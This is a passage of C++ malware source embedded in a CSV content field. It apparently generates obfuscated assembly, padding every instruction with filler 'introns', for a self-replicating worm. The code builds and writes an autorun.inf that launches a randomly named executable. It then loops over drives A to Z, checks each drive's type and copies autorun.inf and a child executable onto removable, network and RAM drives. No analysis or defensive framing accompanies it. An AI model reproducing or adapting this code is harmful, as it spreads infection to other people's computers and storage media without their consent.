id,title,username,language,date,content
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'ute=\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
GetAddress(""RandomFileName"");
file << ""       _nopdB"" << endl; CreateAnIntron();
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
file << ""       _nopsB"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'.exe\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x73550A0D"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'eAut\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'opla\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""3"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'ay=1\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

GetAddress(""autoruninf"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'auto\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""4"");
file << ""       _nopdA"" << endl; CreateAnIntron();
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'run.\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

file << ""       _nopsA"" << endl; CreateAnIntron();
addnumber(""3"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""\'.inf\'"");
file << ""       _writeDWord"" << endl; CreateAnIntron();

zer0(0);
file << ""       _push                ; 0x0"" << endl; CreateAnIntron();
addnumber(""2"");
file << ""       _push                ; 0x2"" << endl; CreateAnIntron();
zer0(0);
addnumber(""CREATE_ALWAYS"");
file << ""       _push                ; CREATE_ALWAYS"" << endl; CreateAnIntron();
zer0(0);
file << ""       _push                ; 0x0"" << endl; CreateAnIntron();
file << ""       _push                ; 0x0"" << endl; CreateAnIntron();
addnumber(""0xC0000000"");
file << ""       _push                ; 0xC0000000"" << endl; CreateAnIntron();
GetAddress(""autoruninf"");
file << ""       _push                ; autoruninf"" << endl; CreateAnIntron();
CallAPI(""hCreateFileA"");

GetAddress(""FileHandle"");
file << ""       _saveWrtOff"" << endl; CreateAnIntron();
file << ""       _nopsA"" << endl; CreateAnIntron();
file << ""       _writeDWord           ; dword[FileHandle]=eax"" << endl; CreateAnIntron();

zer0(0);
file << ""       _push                 ; 0x0"" << endl; CreateAnIntron();
GetAddress(""MapHandle"");
file << ""       _push                 ; Trash-Address"" << endl; CreateAnIntron();
zer0(0);
addnumber(""(AutoStartContentEnd-AutoStartContentStart)"");
file << ""       _push                 ; Size of Buffer"" << endl; CreateAnIntron();
GetAddress(""AutoStartContentStart"");
file << ""       _push                 ; Buffer to write"" << endl; CreateAnIntron();
GetAddress(""FileHandle"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _push                 ; FileHandle"" << endl; CreateAnIntron();
CallAPI(""hWriteFile"");

GetAddress(""FileHandle"");
file << ""       _getdata"" << endl; CreateAnIntron();
file << ""       _push"" << endl; CreateAnIntron();
CallAPI(""hCloseHandle"");

file << ""       _getEIP"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _sub0001"" << endl; CreateAnIntron();
file << ""       _saveJmpOff                  ; Loop over Drive Letter A-Z"" << endl; CreateAnIntron();

file << ""       _pushall"" << endl; CreateAnIntron();
zer0(0);
file << ""               _nopdB                       ; RegB=0"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
GetAddress(""Driveletter1-1"");
file << ""               _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x003A4100"");
file << ""               _writeDWord"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
GetAddress(""Driveletter2-1"");
file << ""               _saveWrtOff"" << endl; CreateAnIntron();
zer0(0);
addnumber(""0x5C3A4100"");
file << ""               _writeDWord"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
zer0(0);
addnumber(""26"");
file << ""               _nopdA                       ; counter"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
file << ""               _getEIP"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _sub0001"" << endl; CreateAnIntron();
file << ""               _saveJmpOff                  ; Loop over Drive Letter A-Z"" << endl; CreateAnIntron();

file << ""               _pushall"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
GetAddress(""Driveletter1+2"");
file << ""                       _saveWrtOff"" << endl; CreateAnIntron();
zer0(1);
file << ""                       _writeByte"" << endl; CreateAnIntron();

GetAddress(""Driveletter1"");
file << ""                       _push"" << endl; CreateAnIntron();
CallAPI(""hGetDriveTypeA"");

file << ""                       _nopsA"" << endl; CreateAnIntron();
file << ""                       _save        ; save Drive type"" << endl; CreateAnIntron();

zer0(1);
addnumber(""0x0010"");
file << ""                       _push"" << endl; CreateAnIntron();

zer0(1);
addnumber(""2"");
subsaved(1);
file << ""                       _JnzDown     ; Is DRIVE_REMOVABLE?"" << endl;
file << ""                           _pop      ; Stack=0x0010"" << endl;
file << ""                           _push"" << endl;
file << ""                           _nopdB    ; RegB=0x0010 -> FILE+AUTOSTART"" << endl;
file << ""                           _nopREAL"" << endl;

file << ""                       _pop            ; Trash away"" << endl; CreateAnIntron();

zer0(1);
addnumber(""0x0040"");
file << ""                       _push"" << endl; CreateAnIntron();

zer0(1);
addnumber(""3"");
subsaved(1);
file << ""                       _JnzDown        ; Is DRIVE_FIXED?"" << endl;
file << ""                           _pop"" << endl;
file << ""                           _push       ; RegB=0x0040 -> FILE"" << endl;
file << ""                           _nopdB"" << endl;
file << ""                           _nopREAL"" << endl;

file << ""                       _pop            ; Trash away"" << endl; CreateAnIntron();

zer0(1);
addnumber(""0x0010"");
file << ""                       _push"" << endl; CreateAnIntron();

zer0(1);
addnumber(""4"");
subsaved(1);
file << ""                       _JnzDown        ; Is DRIVE_REMOTE?"" << endl;
file << ""                           _pop"" << endl;
file << ""                           _push       ; RegB=0x0010 -> FILE+AUTOSTART"" << endl;
file << ""                           _nopdB"" << endl;
file << ""                           _nopREAL"" << endl;


zer0(1);
addnumber(""6"");
subsaved(1);
file << ""                       _JnzDown        ; Is DRIVE_RAMDISK?"" << endl;
file << ""                           _pop"" << endl;
file << ""                           _push       ; RegB=0x0010 -> FILE+AUTOSTART"" << endl;
file << ""                           _nopdB"" << endl;
file << ""                           _nopREAL"" << endl;

file << ""                       _pop            ; Trash away"" << endl; CreateAnIntron();

file << ""               ; ############################################################################"" << endl; CreateAnIntron();
file << ""               ; ##### Copy autorun.inf (or not)"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
GetAddress(""autoruninf"");
file << ""                       _nopdA               ; address to "" << static_cast<char>(34) << ""autorun.inf"" << static_cast<char>(34) << "" to RegA"" << endl; CreateAnIntron();
GetAddress(""Driveletter2"");
file << ""                       _nopdD               ; address to "" << static_cast<char>(34) << ""?:"" << static_cast<char>(92) << ""autorun.inf"" << static_cast<char>(34) << "" to RegD"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
file << ""                       _nopsB"" << endl; CreateAnIntron();
file << ""                       _save"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
zer0(1);
addnumber(""0x0010"");
subsaved(1);
file << ""                       _JnzDown"" << endl;
file << ""                           _nopREAL             ; BC1=0x0"" << endl;
file << ""                           _push                ; bFailIfExists=FALSE"" << endl;
file << ""                           _nopsD"" << endl;
file << ""                           _push                ; lpNewFileName="" << static_cast<char>(34) << ""?:"" << static_cast<char>(92) << ""autorun.inf"" << static_cast<char>(34) << """" << endl;
file << ""               "" << endl; CreateAnIntron();
file << ""               "" << endl; CreateAnIntron();
GetAddress(""hCopyFileA"");
file << ""                       _getdata"" << endl; CreateAnIntron();
file << ""                       _nopdD"" << endl; CreateAnIntron();
file << ""       "" << endl; CreateAnIntron();
zer0(1);
addnumber(""0x0010"");
subsaved(1);
file << ""                       _JnzDown"" << endl;
file << ""                           _nopsA"" << endl;
file << ""                           _push                ; lpExistingFileName="" << static_cast<char>(34) << ""autorun.inf"" << static_cast<char>(34) << """" << endl;
file << ""                           _nopsD"" << endl;
file << ""                           _call                ; stdcall dword[hCopyFileA]"" << endl;
file << ""       "" << endl; CreateAnIntron();

file << ""                       _nopsB"" << endl; CreateAnIntron();
file << ""                       _save                ; restore BC2 (=RegB)"" << endl; CreateAnIntron();

zer0(1);
addnumber(""0x0040"");
file << ""                       _push"" << endl; CreateAnIntron();

zer0(1);
addnumber(""0x0010"");
subsaved(1);
file << ""                       _JnzDown"" << endl;
file << ""                           _pop"" << endl;
file << ""                           _push"" << endl;
file << ""                           _nopdB"" << endl;
file << ""                           _save             ; also copy child executable"" << endl;
